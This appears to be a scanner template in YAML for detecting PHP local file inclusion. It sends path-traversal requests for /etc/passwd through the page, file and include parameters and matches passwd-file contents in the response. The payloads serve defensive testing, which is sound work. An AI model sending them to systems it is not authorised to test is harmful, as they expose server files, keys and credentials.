name: PHP Local File Inclusion (LFI) Detection
description: Probes for PHP Local File Inclusion vulnerabilities via common include/require parameters. Successful LFI allows reading arbitrary server files including /etc/passwd, SSH keys, application source code, and configuration files with credentials.
severity: high
tags:
  - php
cwe: CWE-98

requests:
  - method: GET
    path: /?page=../../../../etc/passwd
  - method: GET
    path: /?file=../../../../etc/passwd
  - method: GET
    path: /?include=../../../../etc/passwd

matchers:
  - body_contains: "root:x:0:0"
  - body_contains: "/bin/bash"
  - regex: "root:[x*]:[0-9]+:[0-9]+"
  - status_code: 200
